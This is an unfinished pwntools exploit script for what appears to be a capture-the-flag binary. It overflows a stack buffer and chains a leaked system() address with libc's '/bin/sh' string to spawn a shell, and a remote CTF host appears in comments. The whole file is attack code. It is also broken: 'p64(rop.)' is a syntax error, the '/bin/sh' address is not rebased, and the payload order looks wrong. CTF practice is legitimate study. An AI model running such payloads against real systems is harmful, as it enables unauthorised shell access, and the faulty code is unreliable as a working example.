from pwn import *


p = process("./a.out")
p.recvline()

d = cyclic(256, n=8)
p.sendline(d)
p.recvline()

raw_offset = p.recvline()[len("addr ") :].strip()
offset = cyclic_find(int(raw_offset.decode(), 16), n=8)
print(offset)

# c = connect("mitt-andra-program.ctfchall.se", 50000, ssl=True)
c = process("./chall")
sys_addr = int(c.recvline().decode().split("Mitt tur-tal idag är ")[-1].split(". Vad heter du?")[0], 16)

libc = ELF("libc.so.6")
bin_sh = next(libc.search(b"/bin/sh\x00"))
print(bin_sh)
print(sys_addr)

rop = ROP("./chall")

payload = b"a" * offset + p64(sys_addr) + p64(bin_sh) + p64(rop.)
# print(payload.decode())
c.sendline(payload);


# c.interactive()

#
# # ncat --ssl mitt-andra-program.ctfchall.se 50000
#
#
#
#
#
# # libc = ELF("./libc.so.6")
#
#
#
